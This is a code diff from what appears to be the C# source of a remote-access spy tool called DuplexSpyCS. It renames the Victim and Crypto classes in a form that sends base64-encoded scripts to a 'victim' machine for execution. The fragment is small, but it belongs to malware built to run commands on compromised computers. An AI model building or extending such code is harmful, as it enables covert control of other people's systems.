@@ -13,7 +13,7 @@ namespace DuplexSpyCS
 {
     public partial class frmRunScript : Form
     {
-        public Victim v;
+        public clsVictim v;
 
         private TextEditorControl editor_code;
 
@@ -73,7 +73,7 @@ namespace DuplexSpyCS
                     break;
             }
 
-            v.SendCommand($"exec|{method}|{Crypto.b64E2Str(editor_code.Text)}|{Crypto.b64E2Str(textBox1.Text)}");
+            v.SendCommand($"exec|{method}|{clsCrypto.b64E2Str(editor_code.Text)}|{clsCrypto.b64E2Str(textBox1.Text)}");
         }
     }
 }
